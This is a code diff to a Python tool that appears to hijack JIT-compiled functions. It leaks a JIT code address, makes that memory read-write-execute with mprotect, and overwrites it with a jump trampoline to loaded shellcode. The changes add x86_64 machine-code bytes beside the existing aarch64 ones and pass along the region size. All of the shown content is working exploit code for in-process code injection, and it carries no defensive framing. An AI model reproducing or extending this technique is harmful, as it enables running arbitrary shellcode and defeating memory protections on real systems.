@@ -3,6 +3,7 @@ import ctypes
 import json
 import mmap
 import os
+import platform
 import struct
 import sys
 import time
@@ -48,7 +49,7 @@ def make_combo_func(magic):
         return s.upper()
     return combo
 
-def get_jit_code_address(combo) -> Optional[int]:
+def get_jit_code_address(combo) -> Optional[Tuple[int,int]]:
     for i in range(6000):
         combo(42, "123AA")
     return jitexecleak.leak_executor_jit(combo)
@@ -93,20 +94,29 @@ def mprotect_rwX(addr: int, size: int = 0x1000):
         raise OSError(f"mprotect RWX failed (errno: {ctypes.get_errno()})")
 
 # Trampoline Execution
-def trampoline_overwrite(jit_addr: int, shell_addr: int, output_dir: pathlib.Path, run_id: int) -> Tuple[bytes, str]:
+def trampoline_overwrite(jit_addr: int, jit_size: int, shell_addr: int, output_dir: pathlib.Path, run_id: int) -> Tuple[bytes, str]:
     """
     Sets up the trampoline in JIT memory.
     Returns:
         Tuple[bytes, str]: (trampoline code, jit map snapshot path)
     """
     dump_path = dump_jit_region_to_log(jit_addr, output_dir, run_id)
-    mprotect_rwX(jit_addr)
-    
-    trampoline = (
-        b"\x50\x00\x00\x58" +  # ldr x16, #8
-        b"\x00\x02\x1f\xd6" +  # br x16
-        struct.pack("<Q", shell_addr)
-    )
+    mprotect_rwX(jit_addr, jit_size)
+
+    arch = platform.machine()
+    if arch == "aarch64":
+        trampoline = (
+            b"\x50\x00\x00\x58" +  # ldr x16, #8
+            b"\x00\x02\x1f\xd6" +  # br x16
+            struct.pack("<Q", shell_addr)
+        )
+    elif arch == "x86_64":
+        trampoline = (
+            b"\xff\x25\x00\x00\x00\x00" +
+            struct.pack("<Q", shell_addr)
+        )
+    else:
+        raise RuntimeError(f"Unsupported architecture: {arch}")
 
     ctypes.memmove(jit_addr, trampoline, len(trampoline))
         
@@ -215,7 +225,7 @@ def run_once(run_id: int, output_dir: pathlib.Path) -> Tuple[str, Dict[str, Any]
         shell_addr = allocate_and_load_shellcode()
         
         # 3. Get JIT address
-        jit_addr = get_jit_code_address(combo)
+        jit_addr, jit_size = get_jit_code_address(combo)
         if not jit_addr:
             return "fail", {
                 "error": "JIT addr not found",
@@ -223,7 +233,7 @@ def run_once(run_id: int, output_dir: pathlib.Path) -> Tuple[str, Dict[str, Any]
             }
         
         # 4. Setup trampoline
-        trampoline, dump_path = trampoline_overwrite(jit_addr, shell_addr, output_dir, run_id)
+        trampoline, dump_path = trampoline_overwrite(jit_addr, jit_size, shell_addr, output_dir, run_id)
         
         # 5. Execute jump
         status, log = jump_to_trampoline(jit_addr, trampoline, shell_addr, before_jit_latency)
